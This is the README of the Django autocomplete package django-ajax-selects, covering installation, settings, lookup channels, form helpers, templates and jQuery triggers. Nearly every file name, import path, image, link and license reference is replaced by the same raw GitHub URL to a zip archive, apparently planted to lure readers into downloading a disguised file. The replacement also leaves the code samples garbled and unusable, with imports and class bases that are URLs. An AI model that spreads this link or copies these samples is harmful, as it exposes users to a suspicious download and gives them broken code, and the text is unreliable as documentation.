
Enables editing of `ForeignKey`, `ManyToMany` and `CharField` using jQuery UI Autocomplete.

User experience
===============

selecting:

<img src='https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'/>

selected:

<img src='https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'/>

[Note: screen shots are from the older version. Styling has changed slightly]

1. The user types a search term into the text field
2. An ajax request is sent to the server.
3. The dropdown menu is populated with results.
4. User selects by clicking or using arrow keys
5. Selected result displays in the "deck" area directly below the input field.
6. User can click trashcan icon to remove a selected item

Features
========

+ Django 1.2+
+ Optional boostrap mode allows easy installation by automatic inclusion of jQueryUI from the googleapis CDN
+ Compatible with staticfiles, appmedia, django-compressor etc
+ Popup to add a new item is supported
+ Admin inlines now supported
+ Ajax Selects works in the admin and also in public facing forms.
+ Rich formatting can be easily defined for the dropdown display and the selected "deck" display.
+ Templates and CSS are fully customizable
+ JQuery triggers enable you to add javascript to respond when items are added or removed, so other interface elements on the page can react
+ Default (but customizable) security prevents griefers from pilfering your data via JSON requests



Quick Installation
==================

Get it

    `pip install django-ajax-selects`
or
    `easy_install django-ajax-selects`
or
    download or checkout the distribution
or
    install using buildout by adding `django-ajax-selects` to your `eggs`

on fedora:
    su -c 'yum install django-ajax-selects'
(note: this version may not be up to date)


In https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip :

    # add the app
    INSTALLED_APPS = (
                ...,
                'ajax_select'
                )

    # define the lookup channels in use on the site
    AJAX_LOOKUP_CHANNELS = {
        #   pass a dict with the model and the field to search against
        'person'  : {'model':'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'search_field':'name'}
    }
    # magically include jqueryUI/js/css
    AJAX_SELECT_BOOTSTRAP = True
    AJAX_SELECT_INLINES = 'inline'

In your https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import admin
    from ajax_select import urls as ajax_select_urls

    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip()

    urlpatterns = patterns('',
        # include the lookup urls
        (r'^admin/lookups/', include(ajax_select_urls)),
        (r'^admin/', include(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip)),
    )

In your https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import admin
    from ajax_select import make_ajax_form
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AjaxSelectAdmin
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *

    class PersonAdmin(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip):
        pass
    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(Person,PersonAdmin)

    # subclass AjaxSelectAdmin
    class LabelAdmin(AjaxSelectAdmin):
        # create an ajax form class using the factory function
        #                     model,fieldlist,   [form superclass]
        form = make_ajax_form(Label,{'owner':'person'})
    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(Label,LabelAdmin)


This setup will give most people the ajax powered editing they need by bootstrapping in JS/CSS and implementing default security and simple ajax lookup channels.

NOT SO QUICK INSTALLATION
=========================

Things that can be customized:

+ how and from where jQuery, jQueryUI, jQueryUI theme are loaded
+ whether to include js/css inline or for better performance via staticfiles or django-compress etc.
+ define custom `LookupChannel` classes to customize:
    + HTML formatting for the drop down results and the item-selected display
    + custom search queries, ordering, user specific filtered results
    + custom channel security (default is staff only)
+ customizing the CSS
+ each channel could define its own template to change display or add extra javascript
+ custom javascript can respond to jQuery triggers when items are selected or removed


Architecture
============

A single view services all of the ajax search requests, delegating the searches to named 'channels'.  Each model that needs to be searched for has a channel defined for it. More than one channel may be defined for a Model to serve different needs such as public vs admin or channels that filter the query by specific categories etc. The channel also has access to the request and the user so it can personalize the query results.  Those channels can be reused by any Admin that wishes to lookup that model for a ManyToMany or ForeignKey field.

A simple channel can be specified in https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip, a more complex one (with custom search, formatting, personalization or auth requirements) can be written in a https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip file.

There are three model field types with corresponding form fields and widgets:

<table>
<tr><th>Database field</th><th>Form field</th><th>Form widget</th>
<tr><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td><td>AutoCompleteField</td><td>AutoCompleteWidget</td></tr>
<tr><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td><td>AutoCompleteSelectField</td><td>AutoCompleteSelectWidget</td></tr>
<tr><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td><td>AutoCompleteSelectMultipleField</td><td>AutoCompleteSelectMultipleWidget</td></tr>
</table>

Generally the helper functions documented below can be used to generate a complete form or an individual field (with widget) for a form.  In rare cases you might need to specify the ajax form field explicitly in your Form.

Example App
===========

See the example app for a full working admin site with many variations and comments. It installs quickly using virtualenv and sqllite and comes fully configured.


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
-----------

#### AJAX_LOOKUP_CHANNELS

Defines the available lookup channels.

+ channel_name : {'model': 'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'search_field': 'name_of_field_to_search' }
> This will create a channel automatically

	chanel_name : ( 'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'YourLookup' )
	    This points to a custom Lookup channel name YourLookup in https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

	AJAX_LOOKUP_CHANNELS = {
        #   channel : dict with settings to create a channel
        'person'  : {'model':'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'search_field':'name'},

        # channel: ( https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip, ClassNameOfLookup )
        'song'   : ('https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip', 'SongLookup'),
    }

#### AJAX_SELECT_BOOTSTRAP

Sets if it should automatically include jQuery/jQueryUI/theme.  On large formsets this will cause it to check each time but it will only jQuery the first time.

+ True: [easiest]
    use jQuery if already present, else use the admin's jQuery else load from google's CDN
    use jqueryUI if present else load from google's CDN
    use jqueryUI theme if present else load one from google's CDN

+ False/None/Not set: [default]
    you should then include jQuery, jqueryUI + theme in your template or js compressor stack


#### AJAX_SELECT_INLINES

This controls if and how these:

    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

are included inline in the html with each form field.

+ 'inline': [easiest]
    Includes the js and css inline
    This gets you up and running easily and is fine for small sites.
    But with many form fields this will be less efficient.

+ 'staticfiles':
    @import the css/js from {{STATIC_URL}}/ajax_selects using `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip`
    Requires staticfiles to be installed and to run its management command to collect files.
    This still imports the css/js multiple times and is thus inefficient but otherwise harmless.

    When using staticfiles you may implement your own `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip` and customize to taste as long
    as your app is before ajax_select in the INSTALLED_APPS.

+ False/None: [default]
    Does not inline anything. You should include the css/js files in your compressor stack
    or include them in the head of the https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip template.
    This is the most efficient but takes the longest to configure.


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
-------

Simply include the ajax_select urls in your site's urlpatterns:

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import admin
    from ajax_select import urls as ajax_select_urls

    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip()

    urlpatterns = patterns('',
        (r'^admin/lookups/', include(ajax_select_urls)),
        (r'^admin/', include(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip)),
    )


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
----------

By convention this is where you would define custom lookup channels

Subclass `LookupChannel` and override any method you wish to customize.

1.1x Upgrade note: previous versions did not have a parent class. The methods format_result and format_item have been renamed to format_match and format_item_display respectively.
Those old lookup channels will still work and the previous methods will be used.  It is still better to adjust your lookup channels to inherit from the new base class.

    from ajax_select import LookupChannel
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import escape
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import Q
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import *

    class PersonLookup(LookupChannel):

        model = Person

        def get_query(self,q,request):
            return https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(Q(name__icontains=q) | Q(email__istartswith=q)).order_by('name')

        def get_result(self,obj):
            u""" result is the simple text that is the completion of what the person typed """
            return https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

        def format_match(self,obj):
            """ (HTML) formatted item for display in the dropdown """
            return https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(obj)

        def format_item_display(self,obj):
            """ (HTML) formatted item for displaying item in the selected deck area """
            return u"%s<div><i>%s</i></div>" % (escape(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip),escape(https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip))

    Note that raw strings should always be escaped with the escape() function

#### Methods you can override in your `LookupChannel`


###### model [property]

The model class this channel searches

###### plugin_options [property, default={}]

Set any options for the jQuery plugin. This includes:

+ minLength
+ autoFocus
+ disabled
+ position
+ source - setting this would overide the normal ajax URL. could be used to add URL query params

See https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

The field or widget may also specify plugin_options that will overwrite those specified by the channel.

###### min_length [property, default=1]

This is a jQuery plugin option.  It is preferred to set this in the plugin_options dict, but this older style attribute will still be honored.

Minimum query length to return a result.  Large datasets can choke if they search too often with small queries.
Better to demand at least 2 or 3 characters.
This param is also used in jQuery's UI when filtering results from its own cache.

###### search_field [property, optional]

Name of the field for the query to search with icontains.  This is used only in the default get_query implementation.
Usually better to just implement your own get_query

######  get_query(self,q,request)

return a query set searching for the query string q, ordering as appropriate.
Either implement this method yourself or set the search_field property.
Note that you may return any iterable so you can even use yield and turn this method into a generator,
or return an generator or list comprehension.

######  get_result(self,obj):

The text result of autocompleting the entered query.  This is currently displayed only for a moment in the text field
after the user has selected the item.  Then the item is displayed in the item_display deck and the text field is cleared.
Future versions may offer different handlers for how to display the selected item(s).  In the current version you may
add extra script and use triggers to customize.

######  format_match(self,obj):

(HTML) formatted item for displaying item in the result dropdown

######  format_item_display(self,obj):

(HTML) formatted item for displaying item in the selected deck area (directly below the text field).
Note that we use jQuery .position() to correctly place the deck area below the text field regardless of
whether the widget is in the admin, and admin inline or an outside form.  ie. it does not depend on django's
admin css to correctly place the selected display area.

######  get_objects(self,ids):

Get the currently selected objects when editing an existing model

Note that the order of the ids supplied for ManyToMany fields is dependent on how the objects manager fetches it.
ie. what is returned by https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip()

In most situations (especially postgres) this order is random, not the order that you originally added them in the interface.  With a bit of hacking I have convinced it to preserve the order [see https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip for solution]

######  can_add(self,user,argmodel):

Check if the user has permission to add one of these models.
This enables the green popup +
Default is the standard django permission check

######  check_auth(self,request):

To ensure that nobody can get your data via json simply by knowing the URL.
The default is to limit it to https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip and raise a PermissionDenied exception.
By default this is an error with a 401 response, but your middleware may intercept and choose to do other things.

Public facing forms should write a custom `LookupChannel` to implement as needed.
Also you could choose to return HttpResponseForbidden("who are you?") instead of raising PermissionDenied


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
--------

#### make_ajax_form(model,fieldlist,superclass=ModelForm,show_help_text=False)

If your application does not otherwise require a custom Form class then you can use the make_ajax_form helper to create the entire form directly in https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip  See https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip below for cases where you wish to make your own Form.

+ *model*: your model
+ *fieldlist*: a dict of {fieldname : channel_name, ... }
+ *superclass*: [default ModelForm] Substitute a different superclass for the constructed Form class.
+ *show_help_text*: [default False]
    Leave blank [False] if using this form in a standard Admin.
    Set it True for InlineAdmin classes or if making a form for use outside of the Admin.

######Example

    from ajax_select import make_ajax_form
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AjaxSelectAdmin
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import YourModel

    class YourModelAdmin(AjaxSelectAdmin):
        # create an ajax form class using the factory function
        #                     model,fieldlist,   [form superclass]
        form = make_ajax_form(Label,{'owner':'person'})

    https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip(YourModel,YourModelAdmin)

You may use AjaxSelectAdmin as a mixin class and multiple inherit if you have another Admin class that you would like to use.  You may also just add the hook into your own Admin class:

    def get_form(self, request, obj=None, **kwargs):
        form = super(YourAdminClass,self).get_form(request,obj,**kwargs)
        autoselect_fields_check_can_add(form,https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip,https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip)
        return form

Note that ajax_selects does not need to be in an admin.  Popups will still use an admin view (the registered admin for the model being added), even if the form from where the popup was launched does not.


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
--------

subclass ModelForm just as usual.  You may add ajax fields using the helper or directly.

#### make_ajax_field(model,model_fieldname,channel,show_help_text = False,**kwargs)

A factory function to makes an ajax field + widget.  The helper ensures things are set correctly and simplifies usage and imports thus reducing programmer error.  All kwargs are passed into the Field so it is no less customizable.

+ *model*:              the model that this ModelForm is for
+ *model_fieldname*:    the field on the model that is being edited (ForeignKey, ManyToManyField or CharField)
+ *channel*:            the lookup channel to use for searches
+ *show_help_text*:      [default False]  Whether to show the help text inside the widget itself.
                        When using in AdminInline or outside of the admin then set it to True.
+ *kwargs*:             Additional kwargs are passed on to the form field.
    Of interest:
        help_text="Custom help text"
    or:
        # do not show any help at all
        help_text=None

    plugin_options - directly specify jQuery plugin options.  see Lookup plugin_options above


#####Example

    from ajax_select import make_ajax_field

    class ReleaseForm(ModelForm):

        class Meta:
            model = Release

        group  = make_ajax_field(Release,'group','group',help_text=None)

#### Without using the helper


    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AutoCompleteSelectField

    class ReleaseForm(ModelForm):

        group = AutoCompleteSelectField('group', required=False, help_text=None)

#### Setting plugin options

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AutoCompleteSelectField

    class ReleaseForm(ModelForm):

        group = AutoCompleteSelectField('group', required=False, help_text=None,plugin_options = {'autoFocus':True,'minLength':4})

#### Using ajax selects in a `FormSet`

There is possibly a better way to do this, but here is an initial example:

`https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip`

    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import modelformset_factory
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import BaseModelFormSet
    from https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip import AutoCompleteSelectMultipleField, AutoCompleteSelectField

    from models import *

    # create a superclass
    class BaseTaskFormSet(BaseModelFormSet):

        # that adds the field in, overwriting the previous default field
        def add_fields(self, form, index):
            super(BaseTaskFormSet, self).add_fields(form, index)
            https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip["project"] = AutoCompleteSelectField('project', required=False)

    # pass in the base formset class to the factory
    TaskFormSet = modelformset_factory(Task,fields=('name','project','area'),extra=0,formset=BaseTaskFormSet)



templates/
----------

Each form field widget is rendered using a template.  You may write a custom template per channel and extend the base template in order to implement these blocks:

    {% block extra_script %}{% endblock %}
    {% block help %}{% endblock %}

<table>
    <tr><th>form Field</th><th>tries this first</th><th>default template</th></tr>
    <tr><td>AutoCompleteField</td><td>templates/autocomplete_{{CHANNELNAME}}.html</td><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td></tr> <tr><td>AutoCompleteSelectField</td><td>templates/autocompleteselect_{{CHANNELNAME}}.html</td><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td></tr>
 <tr><td>AutoCompleteSelectMultipleField</td><td>templates/autocompleteselectmultiple_{{CHANNELNAME}}.html</td><td>https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip</td></tr>
</table>

See https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip below for the use of jQuery trigger events


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
--------------------------------------

If you are using `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip` then you can implement `https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip` and put your app ahead of ajax_select to cause it to be collected by the management command `collectfiles`.

If you are doing your own compress stack then of course you can include whatever version you want.

The display style now uses the jQuery UI theme and actually I find the drop down to be not very charming.  The previous version (1.1x) which used the external jQuery AutoComplete plugin had nicer styling.  I might decide to make the default more like that with alternating color rows and a stronger sense of focused item.  Also the current jQuery one wiggles.

The CSS refers to one image that is served from github (as a CDN):
!['https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'](https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip) 'https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip'

Your own site's CSS could redefine that with a stronger declaration to point to whatever you like.

The trashcan icon comes from the jQueryUI theme by the css classes:

    "ui-icon ui-icon-trash"

The css declaration:

    .results_on_deck https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip { }

would be "stronger" than jQuery's style declaration and thus you could make trash look less trashy.


https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
------------------------------------

You probably don't want to mess with this one.  But by using the extra_script block as detailed in templates/ above you can add extra javascript, particularily to respond to event Triggers.

Triggers are a great way to keep code clean and untangled. see: https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip

Two triggers/signals are sent: 'added' and 'killed'. These are sent to the $("#{{html_id}}_on_deck") element. That is the area that surrounds the currently selected items.

Extend the template, implement the extra_script block and bind functions that will respond to the trigger:

##### multi select:

    {% block extra_script %}
        $("#{{html_id}}_on_deck").bind('added',function() {
                id = $("#{{html_id}}").val();
                alert('added id:' + id );
        });
        $("#{{html_id}}_on_deck").bind('killed',function() {
                current = $("#{{html_id}}").val()
                alert('removed, current is:' + current);
        });
    {% endblock %}

##### select:

    {% block extra_script %}
        $("#{{html_id}}_on_deck").bind('added',function() {
                id = $("#{{html_id}}").val();
                alert('added id:' + id );
        });
        $("#{{html_id}}_on_deck").bind('killed',function() {
                alert('removed');
        });
    {% endblock %}

##### auto-complete text field:

    {% block extra_script %}
        $('#{{ html_id }}').bind('added',function() {
                entered = $('#{{ html_id }}').val();
                alert( entered );
        });
    {% endblock %}

There is no remove as there is no kill/delete button in a simple auto-complete.
The user may clear the text themselves but there is no javascript involved. Its just a text field.


Planned Improvements
--------------------

TODO: + pop ups are not working in AdminInlines yet



Contributors
------------

Many thanks to all who found bugs, asked for things, and hassled me to get a new release out.  I'm glad people find good use out of the app.

In particular thanks for help in the 1.2 version:  sjrd (Sébastien Doeraene), Brian May


License
-------

Dual licensed under the MIT and GPL licenses:
   https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip
   https://raw.githubusercontent.com/komaxdj/django-ajax-selects/master/example/selects_ajax_django_pyeloscopy.zip


